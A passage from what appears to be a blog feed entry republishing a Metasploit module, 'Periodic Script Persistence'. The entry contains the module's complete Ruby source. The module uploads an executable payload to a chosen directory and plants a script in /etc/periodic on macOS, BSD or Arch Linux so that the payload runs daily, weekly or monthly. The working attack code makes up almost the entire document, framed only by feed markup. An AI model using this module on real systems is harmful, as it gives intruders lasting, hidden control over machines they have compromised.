class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Local</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">ExcellentRanking</span><br><br>  <span class="hljs-keyword">prepend</span> <span class="hljs-title class_">Msf</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Remote</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:AutoCheck</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Post::File</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::EXE</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Periodic Script Persistence&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">          This module will achieve persistence by writing a script to the /etc/periodic directory.</span><br><span class="hljs-string">          According to The Art of Mac Malware no such malware species persist in this manner (2024).</span><br><span class="hljs-string">          This payload requires root privileges to run. This module can be run on BSD, OSX or Arch Linux.</span><br><span class="hljs-string">        &#125;</span>,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; <span class="hljs-string">&#x27;gardnerapp&#x27;</span>,<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://taomm.org/vol1/pdfs/CH%202%20Persistence.pdf&#x27;</span>,<br>            <span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://superuser.com/questions/391204/what-is-the-difference-between-periodic-and-cron-on-os-x/&#x27;</span><br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2012-04-01&#x27;</span>,<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [ <span class="hljs-string">&#x27;Mac OS X x64 (Native Payload)&#x27;</span>, &#123; <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_X64</span>, <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [ <span class="hljs-string">&#x27;osx&#x27;</span> ] &#125; ],<br>          [ <span class="hljs-string">&#x27;Mac OS X x86 (Native Payload for 10.14 and earlier)&#x27;</span>, &#123; <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_X86</span>, <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [ <span class="hljs-string">&#x27;osx&#x27;</span> ] &#125; ],<br>          [<span class="hljs-string">&#x27;Mac OS X Apple Sillicon&#x27;</span>, &#123; <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_AARCH64</span>, <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [<span class="hljs-string">&#x27;osx&#x27;</span>] &#125;],<br>          [ <span class="hljs-string">&#x27;Python payload&#x27;</span>, &#123; <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_PYTHON</span>, <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [ <span class="hljs-string">&#x27;python&#x27;</span> ] &#125; ],<br>          [ <span class="hljs-string">&#x27;Command payload&#x27;</span>, &#123; <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_CMD</span>, <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [ <span class="hljs-string">&#x27;unix&#x27;</span> ] &#125; ],<br>        ],<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">4</span>,<br>        <span class="hljs-string">&#x27;SessionTypes&#x27;</span> =&gt; [ <span class="hljs-string">&#x27;shell&#x27;</span>, <span class="hljs-string">&#x27;meterpreter&#x27;</span> ],<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [<span class="hljs-variable constant_">CRASH_SAFE</span>],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [<span class="hljs-variable constant_">REPEATABLE_SESSION</span>, <span class="hljs-variable constant_">EVENT_DEPENDENT</span>],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [<span class="hljs-variable constant_">ARTIFACTS_ON_DISK</span>, <span class="hljs-variable constant_">IOC_IN_LOGS</span>]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      <span class="hljs-title class_">OptEnum</span>.new(<span class="hljs-string">&#x27;PERIODIC_DIR&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Periodic Directory to write script eg. /etc/periodic/daily&#x27;</span>, <span class="hljs-string">&#x27;daily&#x27;</span>, <span class="hljs-string">%w[daily weekly monthly]</span>]),<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>, [<span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;Name of script &#x27;</span>, <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alphanumeric(rand(<span class="hljs-number">6</span>..<span class="hljs-number">13</span>))]),<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;PAYLOAD_DIR&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Directory to write payload to&#x27;</span>, <span class="hljs-string">&#x27;/tmp/&#x27;</span>]),<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;PAYLOAD_FILENAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Name of the payload file.&#x27;</span>, <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alphanumeric(rand(<span class="hljs-number">6</span>..<span class="hljs-number">13</span>))])<br>    ])<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span><br>    periodic = <span class="hljs-string">&quot;/etc/periodic/<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PERIODIC_DIR&#x27;</span>]&#125;</span>/&quot;</span><br><br>    <span class="hljs-keyword">if</span> writable? periodic<br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Vulnerable</span> <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;periodic&#125;</span> is writable&quot;</span><br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Safe</span> <span class="hljs-string">&quot;Unable to write to <span class="hljs-subst">#&#123;periodic&#125;</span>&quot;</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">write_payload</span>(<span class="hljs-params">payload_bin</span>)<br>    payload_dir = datastore[<span class="hljs-string">&#x27;PAYLOAD_DIR&#x27;</span>]<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:BadConfig</span>, <span class="hljs-string">&quot;The <span class="hljs-subst">#&#123;payload_dir&#125;</span> is not writable.&quot;</span>) <span class="hljs-keyword">unless</span> writable? payload_dir<br><br>    payload_dir += <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">unless</span> payload_dir.ends_with? <span class="hljs-string">&#x27;/&#x27;</span><br><br>    payload_file = payload_dir + datastore[<span class="hljs-string">&#x27;PAYLOAD_FILENAME&#x27;</span>]<br><br>    <span class="hljs-keyword">if</span> upload_and_chmodx(payload_file, payload_bin)<br>      print_good <span class="hljs-string">&quot;Writing payload to <span class="hljs-subst">#&#123;payload_file&#125;</span> suceeded&quot;</span><br>    <span class="hljs-keyword">else</span><br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&quot;Unable to write payload to <span class="hljs-subst">#&#123;script&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-comment"># add payload to cleanup</span><br>    <span class="hljs-variable">@clean_up_rc</span> &lt;&lt; <span class="hljs-string">&quot;rm <span class="hljs-subst">#&#123;payload_file&#125;</span> &quot;</span><br>    payload_file<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">write_periodic_script</span>(<span class="hljs-params">payload_file</span>)<br>    periodic_dir = <span class="hljs-string">&quot;/etc/periodic/<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PERIODIC_DIR&#x27;</span>]&#125;</span>/&quot;</span><br><br>    script = periodic_dir + datastore[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>]<br><br>    <span class="hljs-variable">@clean_up_rc</span> &lt;&lt; script.to_s<br><br>    <span class="hljs-keyword">if</span> upload_and_chmodx(script, payload_file.to_s)<br>      print_status <span class="hljs-string">&quot;Succesfully wrote periodic script to <span class="hljs-subst">#&#123;script&#125;</span>. This will execute <span class="hljs-subst">#&#123;payload_file&#125;</span>&quot;</span><br>    <span class="hljs-keyword">else</span><br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&quot;Unable to write <span class="hljs-subst">#&#123;script&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-comment"># determin which version of python is installed on the system and return it&#x27;s path</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_python</span><br>    print_status <span class="hljs-string">&#x27;Getting python version &amp; path.&#x27;</span><br>    python = <span class="hljs-literal">nil</span><br><br>    <span class="hljs-comment"># variable needs to be created before eval, can&#x27;t declare in eval</span><br>    python_version = <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-string">%w[python python2 python3]</span>.each <span class="hljs-keyword">do</span> |<span class="hljs-params">py</span>|<br>      eval(<span class="hljs-string">&quot;python_version = cmd_exec(&#x27;<span class="hljs-subst">#&#123;py&#125;</span> --version&#x27;)&quot;</span>)<br>      <span class="hljs-comment"># No match == able to find python version. Then get it&#x27;s PATH</span><br><br>      <span class="hljs-keyword">if</span> !python_version.<span class="hljs-keyword">include</span>? <span class="hljs-string">&#x27;not found&#x27;</span><br>        print_good <span class="hljs-string">&quot;Found python version <span class="hljs-subst">#&#123;python_version&#125;</span>&quot;</span><br>        python = cmd_exec(<span class="hljs-string">&quot;which <span class="hljs-subst">#&#123;py&#125;</span>&quot;</span>)<br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-keyword">if</span> python.blank?<br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:PayloadFailed</span>, <span class="hljs-string">&#x27;Unable to find python version. Try another payload.&#x27;</span>)<br>    <span class="hljs-keyword">end</span><br>    print_good <span class="hljs-string">&quot;Found python path <span class="hljs-subst">#&#123;python&#125;</span>&quot;</span><br>    python<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    <span class="hljs-variable">@clean_up_rc</span> = <span class="hljs-string">&#x27;sudo &#x27;</span><br><br>    <span class="hljs-keyword">if</span> target[<span class="hljs-string">&#x27;Arch&#x27;</span>] == <span class="hljs-variable constant_">ARCH_PYTHON</span><br>      python = get_python<br>      payload_bin = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;python&#125;</span>\n&quot;</span> + payload.encoded<br>    <span class="hljs-keyword">elsif</span> target[<span class="hljs-string">&#x27;Arch&#x27;</span>] == <span class="hljs-variable constant_">ARCH_CMD</span><br>      payload_bin = <span class="hljs-string">&quot;#!/usr/bin/env bash\n&quot;</span> + payload.raw<br>    <span class="hljs-keyword">else</span><br>      payload_bin = generate_payload_exe<br>    <span class="hljs-keyword">end</span><br><br>    payload_file = write_payload payload_bin<br><br>    write_periodic_script payload_file<br><br>    puts <span class="hljs-string">&quot;Cleanup script:\n\n<span class="hljs-subst">#&#123;<span class="hljs-variable">@clean_up_rc</span>&#125;</span>&quot;</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Periodic Script Persistence&lt;/p&gt;
&lt;p&gt;&lt;str</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
  </entry>
  
</feed>
